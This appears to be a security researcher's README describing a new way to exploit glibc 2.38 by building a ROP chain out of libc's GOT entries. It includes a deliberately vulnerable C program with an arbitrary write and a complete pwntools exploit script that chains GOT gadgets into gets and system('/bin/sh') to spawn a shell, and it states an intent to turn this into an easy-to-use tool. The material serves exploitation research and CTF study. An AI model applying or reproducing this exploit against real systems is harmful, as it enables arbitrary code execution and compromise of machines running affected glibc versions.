# Security Update
In glibc-2.38, it's harder to use this skill since glibc developers make `libc_exe_address` not writable, which is a key value of our exploitation. However, I designed another way to exploit it!
The main idea is to perform ROP on GOT. You can assume we control the whole GOT tab:

- The program calls sink functions, for example, puts
- Puts triggers our first gadget on `slot[0x11]`
- We can modify `slot[0x11]` to `asctime+0x132`, assuming ascime calls slot[0x1] at `asctime+0x140`
- So we can use the code between asctime+0x132` and `asctime+0x140`
- We can repeat the previous steps and set the registers and call gets then perform ROP to get a shell.


# POC
Compile main.c souce code on latest ubuntu-23.10:
```c
#include<stdio.h>
int main(){
    size_t addr = 0;
    size_t len = 0;
    setvbuf(stdout,0,2,0);
    printf("%p\n",printf);
    read(0,&addr,8);
    read(0,&len,8);
    read(0,addr,len);
    // strncasecmp(addr+0x300,"AAAAA",0x100);
    // free(calloc(0x10000,1));    
    puts("n132\n");
} 
```

The following exploit script should return a shell by performing ROP on GOT. 

```python
from pwn import *
context.arch='amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

def Xrop(libc):
    tab = [x for x in range(0x40)]
    # Idea: perform ROP on GOT
    # 1) Trigger puts, which is in the target binary
    # 2) Puts trigger slot0x11 (which is modified to # lea rdi, [rsp+5])
    # 3) The gadget "lea rdi, [rsp+5]" is found by function XropGadgets(0) so it'll trigger another GOT slot
    # 4) In this example, "lea..." gadget triggers 0xb, which is modified to "call slot[34], pop pop pop ... ret"
    # 5) slot[34] is set to gets. It'll read the input and load it to rdi (which is set to rsp+5) so we leave our rop chain on stack
    # 6) After finish slot[34], we execute 4's secont part: pop pop ... ret, which nudges the stack and we can hit our ROPchain
    tab[0x10] = 0x7ffff7de1c40-0x20+0xe # lea rdi, [rsp+5] found by XropGadgets(0)
    tab[0x2e] = 0x7ffff7e5698b # call slot_0x34 and increase rsp by pop*n , fund by XropGadgets(1)
    tab[0x33] = libc.sym['gets'] # gets

    # Make sure gets works as normal
    # So we need to put the original data for slot 8 0x2a 0x31
    tab[0x31] = 0x00007ffff7fdb9d0 
    tab[8] = 0x00007ffff7f28b80
    tab[0x2a] = 0x00007ffff7f29580
    return 0x1fe000+libc.address, flat(tab)
def XropGadgets(behind=1):
    with open("./exe.bin",'rb') as f:
        dt = f.read()
    res = []
    for x in range(len(dt)-0x100):
        if (dt[x]==0xe8 ): # call \x00\x00\x00\x00
            off = u32(dt[x+1:x+5])
            rip = 0x00007ffff7dd2000+x+5
            target = (rip+off)%0x100000000
            if((target< 0xf7dd27b0) and (target>= 0xf7dd23f0) and target&0xf == 0):    
                # if it's on got table        
                res.append(x+0x00007ffff7dd2000)
    libc    = open("/lib/x86_64-linux-gnu/libc.so.6",'rb')
    libc_data = libc.read()
    for x in res:
        success(hex(x))
        x-=0x00007ffff7dac000
        if behind == 1:
            print(disasm(libc_data[x:x+0x20]))
        else:
            print(disasm(libc_data[x-0x20:x]))
        print("="*0x40)
# XropGadgets(0)
# XropGadgets(1)
# exit(1)
libc    = ELF("/lib/x86_64-linux-gnu/libc.so.6")
p       = process("./main")
base = int(p.readline(),16) - 0x5c740
info(hex(base))
gdb.attach(p)
libc.address=base
rop = ROP(libc)
rdi = rop.find_gadget(["pop rdi",'ret'])[0]
ret = rdi + 1
dest, payload = Xrop(libc)
success(hex(len(payload)))
p.send(p64(dest))
p.send(p64(len(payload)))
p.send(payload)
p.sendline(flat([1,2,3,ret,ret,ret,ret,ret,rdi,libc.search(b"/bin/sh").__next__(),libc.sym['system']]))
p.interactive()
```

# Demostration

https://asciinema.org/a/623838


# Todo

- Make it an easy-to-use tool.
- More documents

